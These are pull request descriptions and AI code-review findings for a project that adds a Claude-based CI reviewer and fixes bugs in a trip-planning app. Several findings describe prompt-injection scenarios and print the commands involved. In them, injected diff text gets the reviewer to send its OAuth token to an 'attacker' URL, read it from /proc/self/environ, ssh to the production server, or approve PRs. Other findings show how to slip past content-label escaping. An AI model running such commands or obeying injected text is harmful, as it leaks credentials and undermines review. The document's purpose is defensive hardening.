body:
Adds `research/code-review-evaluation.md`, the first part of the code review research we discussed on 2026-10-16. Results get added after the round 1 runs.

What's in it:

- **Why a second Opus found problems in batch 4.** The reviewer had the design but not the worker's reasons for its shortcuts.
- **What context a reviewer should get.** It needs what the change is meant to do, and should not get why the implementer did it that way.
- **The ways to get a review from Claude,** and what the bundled `/code-review` does.
- **How other tools give the reviewer the task,** and a proposal for this project. The PR description holds the task and the "Done when" results, and the implementer's decisions go in a PR comment.
- **The corpus.** The six batch 4 PRs as commit ranges from before each fix, with an answer key of nine findings and its limits.
- **The round 1 plan.** Opus and Sonnet, each at low and high effort, two runs each, run locally with `claude -p`.

It also adds open items 12 to 14 to `plan/open-items.md`: automated code review, the task-only PR description, and the fix loop.

Points to check:

- **The answer key (section 6.1).** It leaves out the two fixes I asked for, the lock in `save()` and the rest-day waypoints, because no reviewer asked for them. It counts the three findings from reviews I steered, but marks them.
- **Section 6.3.** Each run uses a clone cut off at the end of its range. Otherwise the reviewer could read the fix commits, whose messages name the bugs.
title: Research: code review evaluation

body:
Records round 1 of the code review evaluation in `research/code-review-evaluation.md`, and adds open items 15 to 20.

**What round 1 found**
- The stock `/code-review` at `low` found neither key bug in any run. `medium` found less than `high`.
- Sonnet missed more than Opus and was wrong more often. At `high`, a fifth of its extra findings were wrong, against a tenth for Opus.
- `xhigh` found about the same bugs as `high`, plus more cleanups, for about three times the cost.
- No setting caught plan or doc gaps, only code bugs.
- Opus at `high` is the setting for CI (section 8.5).

**A correction.** Section 4.1 now says the `/code-review` level sets the review's model effort itself. Passing `--effort` has no effect on the review.

**Open items 15 to 20** are review findings worth keeping. One of them matters: item 18, saving places from a search can wait on a write's row lock, which persistence section 4 says can't happen.

The reviews, transcripts, and verdicts are in `scratch/code-review-eval/` on Joe's machine, and aren't committed.

Only `research/code-review-evaluation.md` and `plan/open-items.md` change.
title: Record the code review evaluation results, and pick Opus at high

body:
## Task

Joe's request in chat, with filler words removed:

> Add the code review process to CI, to GitHub Actions, so that when there's any change in src or web directories, along with any other directories you think might make sense to include, it would kick off the code review skill using Claude Code `-p`. And then that would add the comments or reviews to the PR.
>
> When a PR gets created, the description includes just the task and the status of the to-dos, or anything relevant to the completion of that task. Any other details about implementation or decisions need to go in a comment. That way the code reviewer does not see anything from the agent that is implementing that influences its review.
>
> Review on every push to a PR. If it's just pushed to a branch and there's no PR to that branch, then this should not run.

## Done when

- [x] The Code review workflow runs on this PR and posts its findings. Six runs so far, each posting inline comments. The later runs skipped findings already posted.
- [x] `npm run check` passes.

nodes.body:
## Decisions

- **Folders that start a review:** `src/`, `web/`, `migrations/`, `ops/`, `docker/`, `compose.yaml`, and `.github/workflows/`. Docs and plans aren't reviewed, since the stock review found no doc gaps in round 1. Agreed in chat.
- **When it runs:** on open, on each new commit, on reopen, and when a draft is marked ready. Not on drafts, not on PRs from forks, and not on a push with no PR. A new commit cancels the review still running. Agreed in chat.
- **Install, not a container:** Claude Code 2.1.301 is installed with npm in each run. A fresh install took 2.7 seconds locally, and the package is 256 MB, so pulling a prebuilt image wouldn't be faster.
- **The reviewer checks out the PR's head commit,** not GitHub's merge commit, so the code matches the lines its comments point to.
- **Tools:** the same read-only tools as round 1, plus `gh` so it can read the PR and post comments. The job's token can only read code and write PR comments. Edit, Write, and the web are blocked.
- **The review never fails the check.** A clear "ready" signal is part of the fix loop, open item 14.
- **The transcript is saved as a workflow artifact for 30 days,** to check what the reviewer read, such as whether it skipped this comment.
- **CLAUDE.md gets a "Pull requests" section,** with the description rule and the rule telling the reviewer not to read conversation comments. Inline review comments stay readable.
- **The development plan's "Settled in: the PR" phases** now propose their answers in this comment, not the description.

## Set aside

- Nothing new. The fix loop is still open item 14.

## The first review's findings

Fixed in the next commit:

- "The allowed tools let the reviewer write files and reach the network." `node` is now blocked, since the code holds Google text that could carry instructions. The step comment now says what's still possible (`sed`, `awk`, and `gh`) and why that's accepted.
- "Every `synchronize` runs a fresh review that posts all its findings again." CLAUDE.md now tells the reviewer to read the earlier inline comments first, and not post a finding twice.
- "The reviewer reads the implementer's reasons" on inline replies. DEVELOPMENT.md section 7 now says to explain a finding you won't fix in a conversation comment like this one, not on its inline thread.
- "The paths filter leaves out the root build and dependency files." The list was agreed in chat, so the comment now says what's covered instead.
- "review.json is written into the repo root." It's now in `$RUNNER_TEMP`.
- "The artifact name is fixed." It now includes the run attempt.

Not fixed:

- "The checkout is the PR head, so Claude Code loads the PR's own `.claude/settings.json`." A same-repo PR can already change this workflow, which runs from the PR's own copy, so a hook adds no new risk. Fork PRs don't run the review.
- "cancel-in-progress can kill a review while it is posting." Posting takes a few seconds, so this is rare. With the new no-repeats rule, the next review won't post those findings again.
- "The allowlist has no echo, printf, or jq." The review posted its comments with a command using `jq` and `echo`, and it worked. The transcript shows no denied commands.

## The second review's findings

All five are fixed in 5e2c2a7:

- "The skip rule also hides a finding whose fix didn't work." CLAUDE.md now says to post a finding again when its code has changed since and the problem is still there.
- "A review that runs past the job's 30-minute timeout... skips the transcript upload." The review step now has its own 25-minute timeout, which fails only that step.
- "The OAuth token sits in the environment of every command." The step sets `CLAUDE_CODE_SUBPROCESS_ENV_SCRUB: 1`, which the docs say strips credentials from the commands Claude Code runs and leaves GitHub tokens in place. A determined command could still read Claude Code's own process environment, so this narrows the risk rather than closing it.
- "The worker and reviewer prompts in `plan/batch-4.md` section 6 still put them in the description." Batch 4 is a record of a finished run, so the prompts stay as run, with a note to change them before reuse.
- "The root `settings.json` isn't in the paths filter." Added. It holds app behavior, such as the driving limits.

## The fifth review's findings

The fourth run printed its findings without posting them, because `socat` was missing. Fixed in d923389, along with a check that fails the step when the run itself fails.

From the fifth run, fixed in the next commit:

- "The allowlist lacks jq, echo, printf..." Right, and my earlier reply was wrong. Before the sandbox, these ran without approval. Inside it, they need it. `jq`, `echo`, `printf`, `diff`, `tr`, `cut`, and `uniq` are now allowed. `xargs` isn't, since it can start any program.
- "Checking out a detached head SHA... gives only origin/main." A step now makes a local branch for the PR's base.
- "The new note says to change 'both prompts', but section 5 also..." The note now covers section 5 too.
- "Section 9's list of reviewed paths leaves out settings.json." Added.

Not fixed:

- "A finding the implementer declined is posted again whenever the code around it changes." The rule now says "the lines it points to," not "the code," so an edit nearby doesn't count. A finding posted again after its own lines change is worth a second look.
- "A full `apt-get update` runs on every review." The step takes about 8 seconds. Skipping the update risks a stale package list, which would fail more often than the mirrors do.

## The sixth review's findings

Fixed in the next commit:

- "`pull-requests: write` plus `Bash(gh:*)` also lets the reviewer approve, edit, or close the PR." The comment now says it can comment on, edit, or close the PR. It can't approve: the repo's Actions setting blocks approvals.
- "The CI reviewer also gets the allow rules in the checked-in `.claude/settings.json`." True. The comment now says so. The ssh rule fails because the runner has no key, and the merge rule fails because the token can't write to the repo.
- "When `claude` exits non-zero the step stops before the summary lines." The step now keeps the exit code, writes the summary, and then fails.
- "This PR's own description breaks the rule it adds." The description no longer has the open item line. DEVELOPMENT.md now allows dropping filler words from a spoken request, which is what the description does.

Not fixed:

- "`CLAUDE.md`... isn't in the paths filter." CLAUDE.md is a doc, and docs aren't reviewed.
- "GitHub doesn't run `pull_request` workflows while a PR has a merge conflict." The PR page already shows the conflict, and it has to be fixed before a merge anyway. The review runs on the push that fixes it.

**The allowed tools let the reviewer write files and reach the network. That contradicts the step comment saying it can't edit files or reach the web, and the run has CLAUDE_CODE_OAUTH_TOKEN in its environment.**

Failure scenario: A diff or PR description containing a prompt injection gets the reviewer to run `node -e "fetch('https://attacker', {method:'POST', body: process.env.CLAUDE_CODE_OAUTH_TOKEN})"`, which `Bash(node:*)` allows. That leaks the Max subscription token. `sed -i`, `awk system()`, `find -exec/-delete`, and unrestricted `gh api` / `git` also get around the Edit/Write/WebFetch deny list.

**The checkout is the PR head, so Claude Code loads the PR's own `.claude/settings.json` (hooks, permissions) and CLAUDE.md. The PR under review can change how it is reviewed, and can run code that sees the OAuth token.**

Failure scenario: A PR adds a SessionStart or PreToolUse hook to `.claude/settings.json` (or widens `permissions.allow`). The hook runs as a shell command in the review job with CLAUDE_CODE_OAUTH_TOKEN and GH_TOKEN in env. A PR that edits CLAUDE.md can also tell the reviewer to report nothing.

**Every `synchronize` runs a fresh review that posts all its findings again as new inline comments. Nothing removes or skips earlier ones, so each push duplicates the comments.**

Failure scenario: A PR gets 4 pushes while the implementer fixes findings. Unfixed or still-valid findings get posted 4 times on the same lines, and resolved ones from older runs stay as outdated threads. Replying to each finding, as DEVELOPMENT.md asks, becomes noisy.

**CLAUDE.md lets the reviewer read inline review comments. But DEVELOPMENT.md section 7 tells the implementer to reply to each inline finding saying why not, so on the next push the reviewer reads the implementer's reasons.**

Failure scenario: The implementer replies 'not fixing: intentional, see design doc' to an inline finding and pushes. The re-review reads inline threads, which CLAUDE.md allows, takes in the reasoning, and drops or softens the finding. That is the bias this rule is meant to prevent.

**The paths filter leaves out the root build and dependency files (package.json, package-lock.json, vite.config.ts, vitest.config.ts, tsconfig.json, eslint.config.mjs, lefthook.yml, .claude/**). The workflow's own comment says PRs that change how the app is built are reviewed.**

Failure scenario: A PR that only adds or bumps a dependency in package.json/package-lock.json, or changes the Vite build config, gets no review, even though it changes what is built and deployed.

**cancel-in-progress can kill a review while it is posting inline comments. That leaves part of a set of findings tied to an older commit, and the next run posts its own full set.**

Failure scenario: Push A's review posts 3 of 7 comments, then push B cancels it. The PR keeps 3 stale comments from A with no summary, plus B's full set. There is no way to tell the cut-off review apart from a finished one.

**The allowlist has no echo, printf, or jq. In -p mode any other Bash command is denied without asking, so the skill's `gh api` fallback for posting inline comments can fail while the step still passes.**

Failure scenario: The reviewer builds the comment body with `jq -n ... | gh api .../comments --input -` or `echo '{...}' | gh api`. The jq/echo part is denied, nothing is posted, and claude still exits 0. The job goes green with no comments on the PR.

**review.json is written into the repo root, and the shell creates it before claude starts. The reviewer sees an untracked file in its own checkout, and .gitignore doesn't cover it.**

Failure scenario: The /code-review recipe's Phase 0 checks for uncommitted changes and pulls `git diff HEAD` and working-tree state into scope. The reviewer sees `?? review.json` and may include it or comment on it. Writing to "$RUNNER_TEMP/review.json" avoids this.

**The artifact name is fixed and `overwrite` isn't set, so re-running the job in the same workflow run can fail at upload with a name conflict.**

Failure scenario: Joe re-runs a failed or flaky review job. upload-artifact v4+ requires artifact names to be unique per run, so 'review-transcript' already exists and the upload step errors. That loses the transcript the step is there to keep. Fix with `overwrite: true` or a name that includes github.run_attempt.

**The skip rule also hides a finding whose fix didn't work. Nothing lets the next review tell a fixed finding from one still open, so a PR can look clean while the bug is still there.**

Failure scenario: Review 1 posts "X can be undefined on line 40." The implementer pushes a fix that misses one path. Review 2 sees the same bug, finds an earlier inline comment that already makes it, and skips it. The second run posts nothing, and anyone reading the latest run, such as the fix loop in open item 14 that treats a clean review as "ready for Joe", takes the bug as fixed. Re-post (or reply "still present at <sha>") when the defect is still in the current head, and skip only when it was already raised for this same commit.

**A review that runs past the job's 30-minute `timeout-minutes` gets cancelled, so `if: ${{ !cancelled() }}` skips the transcript upload. That loses the transcript in the case where it's needed most.**

Failure scenario: A large PR keeps the reviewer going past 30 minutes. GitHub cancels the job, `cancelled()` is true, "Save the transcript" is skipped, and there is no record of what the reviewer read or where it stalled. Put the timeout on the "Review the PR" step instead (`timeout-minutes: 28` there), so a timeout fails that step without cancelling the job and the upload still runs. Or use `if: always()` and accept uploads from cancelled runs.

**Blocking `Bash(node:*)` closes one route, but the real problem is that the OAuth token sits in the environment of every command the reviewer runs. It can still be read and posted with the allowed tools.**

Failure scenario: Injected text in the diff gets the reviewer to run `cat /proc/self/environ` or `awk 'BEGIN{print ENVIRON["CLAUDE_CODE_OAUTH_TOKEN"]}'` (both allowed), then `gh pr comment` or `gh api` with the value (allowed). The Max subscription token ends up in a PR comment. GitHub masks secrets in logs, but not in comments. Also, in `-p` mode a command that isn't on `--allowedTools` is already denied, so the node rule adds little. Setting `CLAUDE_CODE_SUBPROCESS_ENV_SCRUB: 1` on this step strips the Anthropic credentials from the subprocess environment and fixes it at the source, whatever command is used.

**The new rule puts decisions in a comment, but the worker and reviewer prompts in `plan/batch-4.md` section 6 still put them in the description. Open item 13 says adopting this "would change the worker prompt," and this PR marks it settled without changing the prompt.**

Failure scenario: A coordinator reuses the batch-4 worker prompt for a later batch. Line 66 tells the worker that the PR "description lists ... each decision you made, what you set aside ..., and any config change". The CI reviewer then reads the implementer's reasons in the description, which is the bias this change is meant to stop. The reviewer prompt (line 79) also checks "each decision in the PR description." Update both prompts to point at the decisions comment.

**The root `settings.json` isn't in the paths filter, but it's app behavior, not tool config. `src/config/settings.ts` loads it, and `docker/app.Dockerfile` copies it into the image.**

Failure scenario: A PR changes only `settings.json`, for example raising `maximumDailyDrivingHours` or `maximumMemoryItemCharacters`. It changes what the deployed app does, but the workflow doesn't run, and DEVELOPMENT.md says each PR that changes the app is reviewed. Add `"settings.json"` to `paths`.

**Still not fixed by the changes since the earlier comment: the allowlist has no `jq`, `echo`, `printf`, `tr`, `cut`, `xargs`, or `diff`. In `-p` mode any command off the list is denied, so the review loses common tools, and a `gh api` post built through a pipe fails without failing the step.**

Failure scenario: This review run tried `jq --version` and got "This command requires approval", which `-p` treats as a denial. A reviewer that builds a comment with `jq -n ... | gh api .../comments --input -` posts nothing. The new `jq -e '.is_error == false'` check only catches a failed run, not denied tool calls, so the job still goes green with no comments on the PR. Add `"Bash(jq:*)"`, `"Bash(echo:*)"`, `"Bash(printf:*)"` and the other read-only text tools to `--allowedTools`.

**A finding the implementer declined gets posted again each time the code around it changes. The decline reason sits in a conversation comment, which this rule tells the reviewer not to read, and DEVELOPMENT.md forbids replying on the inline thread.**

Failure scenario: Review 1 flags line 40. The implementer explains in a conversation comment why it stays, as DEVELOPMENT.md section 7 asks. A later push edits line 41 for another reason. Review 2 sees "the code it points to has changed since, and the problem is still there," so it posts the finding again and says the change did not fix it. That repeats on every edit near that line. Nothing the reviewer may read records that the finding was declined. One fix is a short marker on the inline thread, such as a "declined" reaction or label, that the reviewer can read without reading the reason.

**`fetch-depth: 0` on a detached head SHA fetches `origin/main` but makes no local `main` branch, and there is no upstream. So `git diff @{upstream}...HEAD` and `git diff main...HEAD` both fail here.**

Failure scenario: In this run, `git rev-parse --verify main` returns nothing and `git branch -a` shows only `remotes/origin/*`. If the reviewer works out scope or history with git, as the comment above expects ("so the reviewer can use git log"), `main...HEAD` errors and the recipe falls back to `git diff HEAD~1`, which is only the last commit of a multi-commit PR. The review is fine only while it uses `gh pr diff`. Add a step that runs `git branch main origin/main`, or check out with `ref` left as is and fetch `main` by name.

**The note covers "both prompts," but section 5 of this doc also tells the coordinator to put decisions in the final PR description. That part is not flagged for change.**

Failure scenario: A later batch reuses this doc and updates the two prompts as the note says. Lines 47 to 52 still have the final `development` to `main` PR description list "each decision Joe should look at" and "config changes a worker wanted." If that PR changes `src/`, the CI reviewer reads those reasons in the description, which is the bias DEVELOPMENT.md section 7 now rules out. Name section 5 in the note too, or move those items to the decisions comment.

**This list of reviewed paths leaves out `settings.json`, which the workflow and DEVELOPMENT.md section 7 now include.**

Failure scenario: Someone checks this section to find out whether a change to `settings.json` alone is reviewed. It says no, but the workflow `paths` filter (line 20) does run on it. Add `settings.json` to the list so it matches the workflow.

**`apt-get update` runs on every review and refreshes all package lists just to install two small packages. That adds time to each run, and an outage of the Ubuntu mirrors fails the review.**

Failure scenario: Each push to a PR waits on a full package-list refresh before the review starts. When a mirror is slow or down, `apt-get update` fails and the whole review job fails, though nothing is wrong with the PR. Install without the update first and only run the update if that fails (`sudo apt-get install -y ... || { sudo apt-get update -qq && sudo apt-get install -y ...; }`), or check whether the ubuntu-24.04 image already has `bwrap` and `socat`.

**The comment says the GitHub token "can only read code and write PR comments", but `pull-requests: write` with `Bash(gh:*)` also lets the reviewer edit the PR description, close the PR, or submit an approving review.**

Failure scenario: Google text in the diff carries instructions, and the reviewer runs `gh pr review --approve`, `gh pr edit --body ...`, or `gh pr close`. If the repo allows Actions to approve PRs and branch protection counts one approval, the bot approval counts toward the merge rule. An edited description also changes the task the next review starts from. Narrowing `gh` to the subcommands the review needs does not help on its own, since `gh api` can do all of these. So the comment should state the real reach, and the repo setting "Allow GitHub Actions to create and approve pull requests" should stay off.

**The reviewer also gets the allow rules from the checked-in `.claude/settings.json`, which include `Bash(ssh root@projects.jjk3.com:*)` (the production server) and `Bash(gh pr merge:*)`. `--allowedTools` adds to those rules, it does not replace them.**

Failure scenario: Injected text gets the reviewer to run `ssh root@projects.jjk3.com ...`. It runs with no prompt. Today it most likely fails, because the runner has no key and the sandbox blocks the network. But nothing in this workflow keeps it that way, and the step comment says the reviewer gets only read-only tools plus gh. Pass `--setting-sources user`, or add `Bash(ssh:*)` to `--disallowedTools`, so CI does not pick up the local developer allow list.

**When `claude` exits non-zero, the shell stops at this line because Actions runs bash with `-e`. The summary lines and the `is_error` check below never run, so the job summary is empty and does not say why the review failed.**

Failure scenario: The token expires or a usage limit is hit. `claude -p` writes an error JSON and exits 1. The step fails with no step summary, and the reason is only in the artifact. When it exits 0 with `is_error: true`, `jq -r .result` writes `null` to the summary. Capture the exit code (`claude ... > review.json || status=$?`), write the summary, then `exit ${status:-0}` after the `is_error` check.

**`CLAUDE.md` is not in the paths filter, but this PR puts the reviewer's own rules there (start from the description, skip conversation comments, skip repeated findings). A PR that changes only those rules is never reviewed.**

Failure scenario: A PR edits only the "Pull requests" section of CLAUDE.md, for example to let the reviewer read conversation comments, or to widen the skip rule. No review runs on it, and every later review follows the new rule. Add `CLAUDE.md` to `paths`, or list it in DEVELOPMENT.md section 7 as left out on purpose.

**GitHub does not run `pull_request` workflows while a PR has a merge conflict, since there is no merge commit to test. A conflicted PR gets no review, and nothing on the PR shows that.**

Failure scenario: Batch 3 PRs are merged in order. After the first merge, the next PR conflicts with `main`, and the implementer pushes fixes before rebasing. Those pushes trigger no Code review run and no failed check, so it looks like the review found nothing. Say so in DEVELOPMENT.md section 7 (rebase before expecting a review).

**This PR's own description does not follow the rule it adds. The rule says the task goes in "word for word", but the description gives Joe's request "with filler words removed" and adds "Open items 12 and 13.", which is neither the task nor a "Done when" result.**

Failure scenario: CLAUDE.md now says "A PR description holds only the task and the \"Done when\" results." The first PR under the rule paraphrases the task and adds a note. Later implementers copy it, and the reviewer gets an edited version of the intent instead of the request itself. Either quote the request as given, or change the rule to allow light cleanup and links to open items.

**The env scrub added since the earlier comment on line 94 does not fix it for the Read, Grep, and Glob tools. They run inside the `claude` process, not in a scrubbed subprocess, and the environment of that process still holds `CLAUDE_CODE_OAUTH_TOKEN`.**

Failure scenario: Google text in the diff tells the reviewer to open the `environ` file under `/proc/self` with the Read tool. `Read` is allowed for every path, so it returns the environment of the `claude` process, token included. The reviewer then runs `gh pr comment <n> --body ...` (allowed by `Bash(gh:*)`), and the token is posted on the PR and also saved in the transcript artifact. If the bubblewrap sandbox does not give Bash its own PID namespace, `cat` on the parent process `environ` file works the same way. Deny `/proc` to the file tools, for example `--disallowedTools "Read(//proc/**)" "Grep(//proc/**)" "Glob(//proc/**)"`, or limit Read to the checkout.

**The summary fallback still loses the reason in two cases. The earlier `bash -e` fix covers only a run that writes a complete result JSON.**

Failure scenario: (1) `claude` crashes, is OOM-killed, or writes nothing or non-JSON to stdout. This `jq` then fails on a parse error, and `bash -e` ends the step there. The summary is empty and the final `exit` never runs. (2) The run ends with an error subtype such as `error_during_execution` or `error_max_turns`. Those results have no `.result` field, so the summary says `null`, and the cost line says `$null`. In both cases the summary does not say why the review failed, though the comment on line 90 says it will. Use `jq -r ".result // .subtype // \"no result\""`, guard each `jq` with `|| true` (or check that the file parses first and fall back to `cat`), and keep the status exit last.

**For `pull_request`, the `paths` filter is checked against the whole PR diff, not the files in the new push. Once a PR touches `src/`, every later push reruns a full Opus review, even when the push changes only docs or plans.**

Failure scenario: A phase PR changes `src/`. The implementer then pushes a commit that only fills in the development plan table or fixes a typo in a design doc. `synchronize` fires, the filter still matches because of `src/` in the PR diff, and a full high review runs again. That uses up to 25 minutes and Max quota, and posts findings again on code that did not change. A cheaper alternative: on `synchronize`, add a first step that runs `git diff --name-only` from `github.event.before` to `github.event.after` against the same paths, and skip the review when nothing matches.

**These reviewer-only rules sit in the root CLAUDE.md, so every session in the repo loads them, and nothing enforces them. The CI run grants `Bash(gh:*)`, so reading conversation comments is still one command away.**

Failure scenario: (1) Every implementer and batch worker session gets the rules for reading comments and skipping findings in its context. Those sessions do not need them, and a worker that also reviews can mix up the two roles. (2) In CI, the reviewer runs `gh pr view <n> --json comments` or `gh api repos/.../issues/<n>/comments`, for example to work out what changed since the last review. Both are allowed, and the decisions comment is read anyway. Only someone reading the transcript afterward would catch it. A deeper fix: pass the reviewer rules to the CI run with `--append-system-prompt` in the workflow, and add `--disallowedTools` rules for the commands that read comments (`gh pr view --comments`, `gh api` on `issues/*/comments`). Then the rule is enforced, not just stated.

**Three docs state the description rule three ways. This section adds "what was checked by hand", but CLAUDE.md line 20 and development-plan.md line 14 say the description holds *only* the task and the "Done when" results.**

Failure scenario: An implementer goes by CLAUDE.md, which is always loaded, and leaves out the hand checks, such as a real Google call or a manual database check. Or the CI reviewer, which reads CLAUDE.md, flags a "checked by hand" section as breaking the "only" rule. Use the same wording in all three places, for example by adding "and what was checked by hand" to CLAUDE.md and the development plan.

body:
## Task

Fix open items 15 to 20 in `plan/open-items.md`. Joe agreed to these designs in chat on 2026-10-16:

- Item 18: trip writes lock the trip row with `FOR NO KEY UPDATE` instead of `FOR UPDATE`. Writes still take turns, but the lock no longer blocks the foreign-key check on a place insert, so place saves stop waiting, which matches persistence design section 4 ("searches never wait"). Place saves insert in place ID order, so two saves can't deadlock. Update persistence design section 4 to name the new lock.
- Item 20: `update_itinerary` refuses a new start place when today at that place is already on or after the start date. That's the same rule `setStartDate` uses. Write it into domain model 3.4 (and wherever else the start-date rule is described).
- Items 15, 16, 17, and 19: fix them as each item describes. For item 19, make one real call to Google Routes with the same start and end place, and handle what it returns.

Strike out each item when it's fixed, as `plan/open-items.md` says.

## Done when

- **Item 15.** `labeledAsPlaceContent()` now escapes every `<` in the text. Tests: a closing tag in any case, nested, with a space, or split by a line, and a fake opening tag, all leave only the label's own two tags.
- **Item 16.** Both Google clients now read the reply's body inside the same error handling as the call. A timeout while reading the body gets "didn't answer within 10 seconds. Try again." Only a body that isn't JSON counts as "a response the app doesn't understand." Tests in both clients use a body whose stream fails with a `TimeoutError`. A Places test checks that an HTML body still gets the "doesn't understand" message. An error reply whose body breaks off keeps its status, such as "refused the search with status 403." A good reply whose body breaks off gets "couldn't be reached." Checked by hand that Node's real `fetch` fails `response.json()` with a `TimeoutError` when the timeout fires partway through the body.
- **Item 17.** The "which days have a leg" rule now lives only in a new `Calendar.hasLeg()`, which the schedule and `LegsService` both use. It returns false while the day's start or end place is unknown. Test: a new trip's only day has an empty schedule and 0 minutes of driving, and still has no drive once only the start place is set. Two selected stops on that day have unknown times, not made-up ones as if there were no driving.
- **Item 18.** `TripRepository.loadForWrite()` uses `FOR NO KEY UPDATE`. `PlaceRepository.addPlaces()` inserts its rows sorted by Google place ID. Tests check the lock in the SQL and the row order. Checked by hand against a throwaway Postgres 18, with the repo's migrations:
  - A place insert while a write holds `FOR UPDATE` waited 2.6 s. With `FOR NO KEY UPDATE`, it waited 0.1 s.
  - A second write while a write holds `FOR NO KEY UPDATE` waited 2.6 s, so writes still take turns.
  - Two saves adding the same two new places in opposite order hit "deadlock detected". In the same order, both finished with no error, and one row each was kept.
- **Item 19.** The real Google Routes call, Monterey to Monterey with no stops, answered status 200 with one leg of `"0s"`, no `distanceMeters`, and the route line `c|j~Efe_gV`. The existing schema reads that. The answer is saved as `route-same-place.json`, and a test routes it to 0 minutes, 0 miles, and that line. A second call, Monterey to Monterey through First Awakenings, came back as a normal two-leg route.
- **Item 20.** New `ItineraryService.setStartPlace()` refuses a start place where today is on or after the start date. Start place changes now go only through it. Tests: a start place with no start date is set. A move to Pittsburgh at 8 p.m. in Moab is allowed. The same move at 11 p.m. in Moab (1 a.m. on the start date in Pittsburgh) is refused, and the start place stays Moab.
- **Open items 15 to 20** are struck out, each with how it was settled.
- **`npm run check`** passes: format, typecheck, lint, and 458 tests in 56 files.

nodes.body:
## Decisions

- **"Place ID order" means Google place ID order.** The conflict that can deadlock is on `(trip_id, google_place_id)`. The app's own place ID is new on each search, so it can't give two saves the same order. The IDs are compared as plain strings, not by locale. Written into persistence design sections 4 and 8.7.
- **Persistence design section 4 now says why it's "for no key update."** A place insert's foreign-key check takes a light lock on the trip row, which "for update" blocks and "for no key update" doesn't. It also explains the insert order and the deadlock it prevents.
- **The start place is now `{viaService}`.** A rule that needs today's date is a business rule, so it has to live in a service. `Itinerary.startPlace` lost its setter. It changes only through `ItineraryService.setStartPlace()`, which calls the itinerary's `VIA_SERVICE` method. Every fake and test that set it directly now goes through the service, or through `VIA_SERVICE` inside `src/domain/`. Written into domain model 3.4 (property table, "Start and end places", a new "A new start place can't start the trip" paragraph, Rules), the class diagram, and 4.9. The `{keepsValue}` example in domain model section 1 moved from `startPlace` to `endPlace`, since `endPlace` is still the plain case.
- **The calendar has a new `todayAt(place)`.** `setStartPlace()` needs today at the new place before it's set, and `today(itinerary)` only knows the current start place. Written into domain model 4.1's table.
- **When `update_itinerary` gets both a start place and a start date, it still sets the place first.** So the new place is checked against the old start date. That wrongly refuses one rare case: moving the start place east late at night while also pushing the date later. The error says to set a later start date first, so the coordinator can do it in two calls. Written into domain model 3.4 and 4.9. The tool isn't built yet.
- **The start-date rule is described in more places.** Tool design (`update_itinerary`) and technical spec section 8 (the check table and "Start date not after today") now mention the start place check.
- **Item 17 also went into domain model 4.1.** The schedule rules now say a day whose ends aren't known has no drives.
- **Item 19 needed no code change.** Google sent `encodedPolyline` and the leg's `"0s"`, and left out `distanceMeters`, which the schema already defaults to 0. Written into Google design 2.3 as a new bullet. I made two real calls, not one. The second, Monterey to Monterey through a stop, checked a day that stays put. It came back as a normal route.
- **Item 16's fix is a shared helper,** `src/google/json-body.ts`. It returns null only for a `SyntaxError`, and passes any other failure on.

## Set aside

Nothing.

## Config changes

None needed.

**The close-tag strip catches only the exact tag, and stripping can assemble a fake opening tag.** `/<\/place_content>/gi` does not match near-variants such as `</place_content >` or `</place_content` followed by a newline and `>`. Review text using one of those passes through unchanged, and a model may read it as the end of the label. Separately, `<place_</place_content>content source="Google">` is stripped down to `<place_content source="Google">`, which fakes a new label inside the content. Escaping `<` (the other fix open item 15 suggests) would block every variant and remove the need for the loop.

**This copies the "which days have a leg" rule from `LegsService.#routeFor()` again.** Item 17 came from these two copies drifting apart. The next change to the domain model 4.7 rule has to be made in both `Calendar.#hasDrives` and `LegsService.#routeFor`. If one is missed, the schedule shows drives, or 0 minutes of driving, for a day whose leg says otherwise. A public `Calendar.hasLeg(itinerary, day)` that both use would leave one copy of the rule: no leg on a rest day, on a day missing an end, or on a day that stays put with no selected stop.

**The new start place is checked against the old start date, so a valid combined change is refused.** Example: at 11 p.m. on Oct 9 in Moab, with start date Oct 10, the coordinator sends one `update_itinerary` with startPlace=Pittsburgh and startDate=Oct 12. The tool sets the place first, `setStartPlace` compares Oct 10 with today in Pittsburgh (Oct 10), and the whole call is refused, even though the end state is valid. The coordinator then needs two calls in a set order. A single check on the final start-place and start-date pair, such as `setStartPlaceAndDate` or a check at the end of the write, would allow it.

**The runtime guard against emptying `startPlace` was removed.** The old setter ran `keptValue()`. This change method sets `#startPlace` with no check, and the "can not be emptied" assertion for `startPlace` was deleted from `itinerary.test.ts`. DEVELOPMENT.md section 8 says a `{keepsValue}` property refuses null when it is set, and that a VIA_SERVICE change method runs the object own rules. Now, any caller that gets past the types, such as a cast or a null from code with looser types, can set the start place to null. The itinerary is then left with a start date but no start place, and `today()` returns null. Wrapping the value in `keptValue(startPlace, ...)` and putting the assertion back would restore the check.

**An error response whose body fails to read now loses its HTTP status.** If Google returns a 403 or 500 and the connection drops partway through the body, undici rejects `response.json()` with `TypeError: terminated`. `jsonBodyOf` passes that on, and the catch maps it to "Google Places could not be reached. Try again." Before this change, the body became null and the agent got "refused the search with status 403", which tells it the key or quota is the problem, not the network. `routes-client.ts:136` behaves the same way. Treating a failed body read as a null body whenever the response is not ok (and the error is not a timeout) would keep the status.

**This duplicates a fixture from the Places tests.** The failing `ReadableStream` written out here is the same as `bodyThatTimesOut()` in `places-client.test.ts`. If the way timeouts surface changes, such as the error name or undici behavior, both copies need the same edit. Moving the helper into a shared `.fake.ts` in `src/google/` and importing it in both tests would remove the duplicate.

**This loop can be shorter.** It keeps two variables and calls `replaceAll` in two places. A do/while loop with one variable, which replaces until the text stops changing, does the same job. Escaping `<` (see the comment on line 18) would remove the loop entirely.

**A day with selected stops but an unknown end now gets made-up stop times instead of unknown ones.** `hasLeg()` now returns false while `toPlaceOf()` is null, and `#timelineOf()` passes that as `hasDrives`. In `day-timeline.ts`, `#nextDrive()` returns 0 when `hasDrives` is false, so each stop gets a concrete arrival as if no driving were needed. Before, `hasDrives` was true with `driveMinutes` null, so those times were unknown. Example: a new day trip with a start place and no end place yet, and two selected stops on its only day (`add_stops` does not refuse this). The schedule now shows the first stop at the usual start time and the second right after the first ends. `openTimeInMinutesOf()` then measures opening hours against those times, so the opening hours and late checks can warn on times that mean nothing. The `hasDrives` comment in `day-timeline.ts` (line 22) also still lists only rest days and stay-put days. Keeping "no drives" for rest and stay-put days, and giving unknown drives (null) for a day whose ends are not known, would keep those times unknown.

